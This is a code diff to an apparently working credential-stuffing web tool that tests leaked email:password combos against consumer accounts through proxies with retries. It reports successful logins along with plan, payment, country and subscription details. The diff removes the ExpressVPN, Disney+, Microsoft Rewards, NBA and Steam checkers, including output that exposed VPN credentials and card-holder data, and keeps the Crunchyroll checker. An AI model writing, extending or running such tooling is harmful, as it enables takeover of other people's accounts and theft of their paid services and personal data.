@@ -189,12 +189,7 @@ HTML_TEMPLATE = r"""
         </header>
         
         <select id="service" class="service-select" onchange="updateDesc()">
-            <option value="expressvpn">🌐 ExpressVPN</option>
             <option value="crunchyroll" selected>🍿 Crunchyroll</option>
-            <option value="disney">🏰 Disney+</option>
-            <option value="microsoft">🎮 Microsoft Rewards</option>
-            <option value="nba">🏀 NBA League Pass</option>
-            <option value="steam">🎮 Steam</option>
         </select>
         <div class="service-desc" id="serviceDesc">Checks Crunchyroll accounts using email:pass combos.</div>
 
@@ -215,12 +210,7 @@ HTML_TEMPLATE = r"""
 
     <script>
         const descMap = {
-            'expressvpn': 'Checks ExpressVPN accounts using email:pass combos. Returns plan, expiry, OVPN/PPTP creds.',
-            'crunchyroll': 'Checks Crunchyroll accounts using email:pass combos. Returns plan, streams, country, expiry.',
-            'disney': 'Checks Disney+ accounts using email:pass combos. Returns plan, status, profiles, Hulu status.',
-            'microsoft': 'Checks Microsoft Rewards accounts using email:pass. Returns balance, subscriptions, points.',
-            'nba': 'Checks NBA League Pass accounts using email:pass. Returns display name, expiry, country.',
-            'steam': 'Checks Steam accounts using email:pass. Returns games, level, VAC bans, notable titles.'
+            'crunchyroll': 'Checks Crunchyroll accounts using email:pass combos. Returns plan, streams, country, expiry.'
         };
 
         function updateDesc() {
@@ -427,15 +417,10 @@ def check():
             logs.append(f"[{ts}] {msg}")
 
     checker_map = {
-        'expressvpn': checker.ExpressVPNChecker,
-        'crunchyroll': checker.CrunchyrollChecker,
-        'disney': checker.DisneyChecker,
-        'microsoft': checker.MicrosoftRewardsChecker,
-        'nba': checker.NBAChecker,
-        'steam': checker.SteamChecker
+        'crunchyroll': checker.CrunchyrollChecker
     }
     
-    CheckerClass = checker_map.get(service, checker.CrunchyrollChecker)
+    CheckerClass = checker.CrunchyrollChecker
 
     def check_entry(email, password, proxy_manager):
         max_attempts = 3
@@ -545,21 +530,8 @@ def download(task_id):
         d = res.get('data', res)
         identifier = f"{entry[0]}:{entry[1]}"
 
-        if svc == 'expressvpn':
-            return f"{identifier} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expire_date', 'N/A')} ({d.get('days_left', 0)}d) | Auto: {d.get('auto_renew', 'N/A')} | Pay: {d.get('payment_method', 'N/A')} | Lic: {d.get('license', 'N/A')} | OVPN: {d.get('ovpn_user', '')}:{d.get('ovpn_pass', '')} | PPTP: {d.get('pptp_user', '')}:{d.get('pptp_pass', '')}"
-        elif svc == 'crunchyroll':
+        if svc == 'crunchyroll':
             return f"{identifier} | User: {d.get('user', 'N/A')} | Plan: {d.get('plan', 'N/A')} | Streams: {d.get('streams', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Renew: {d.get('renew', 'N/A')} | CC: {d.get('country', 'N/A')} | Pay: {d.get('payment', 'N/A')} | SKU: {d.get('sku', 'N/A')}"
-        elif svc == 'disney':
-            profiles = ', '.join(d.get('profiles', []))
-            return f"{identifier} | Plan: {d.get('plan', 'N/A')} | Status: {d.get('subscriber_status', 'N/A')} | CC: {d.get('country', 'N/A')} | Billing: {d.get('billing_cycle', 'N/A')} | Pay: {d.get('payment_provider', 'N/A')} | Expiry: {d.get('expiry', 'N/A')} ({d.get('remaining_days', 'N/A')}d) | Trial: {d.get('free_trial', 'N/A')} | Ver: {d.get('email_verified', 'N/A')} | Hulu: {d.get('hulu', 'N/A')} | Profiles: {profiles}"
-        elif svc == 'microsoft':
-            return f"{identifier} | CC: {d.get('country', 'N/A')} | Holder: {d.get('card_holder', 'N/A')} | Bal: {d.get('balance', 'N/A')} | Subs: {d.get('purchased_items', 'N/A')} | Auto: {d.get('auto_renew', 'N/A')} | Start: {d.get('start_date', 'N/A')} | Renew: {d.get('renewal_date', 'N/A')} | Pts: {d.get('points', 'N/A')}"
-        elif svc == 'nba':
-            return f"{identifier} | Name: {d.get('displayname', 'N/A')} | Expiry: {d.get('end_date', 'N/A')} | CC: {d.get('country', 'N/A')} | Renew: {d.get('renewal', 'N/A')}"
-        elif svc == 'steam':
-            notable = ', '.join([g['name'] for g in d.get('notable', [])])
-            top10 = ', '.join([f"{g['name']}({g['playtime']}m)" for g in d.get('games_list', [])[:10]])
-            return f"{identifier} | Persona: {d.get('persona', 'N/A')} | ID: {d.get('steamid', 'N/A')} | CC: {d.get('country', 'N/A')} | Lvl: {d.get('level', 'N/A')} | Games: {d.get('game_count', 'N/A')} | VAC: {d.get('vac_bans', 0)} | Trade: {d.get('trade_ban', 'N/A')} | Lim: {d.get('limited', 'N/A')} | Notable: {notable} | Top10: {top10}"
         return f"{identifier} | HIT"
 
     for entry, res in task_results:
